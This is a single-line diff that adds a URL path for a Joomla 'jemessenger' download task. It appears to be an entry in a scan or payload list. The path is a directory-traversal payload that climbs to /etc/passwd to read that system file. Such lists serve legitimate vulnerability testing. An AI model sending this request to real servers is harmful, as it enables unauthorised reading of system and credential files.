@@ -1,0 +1,1 @@
+/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd
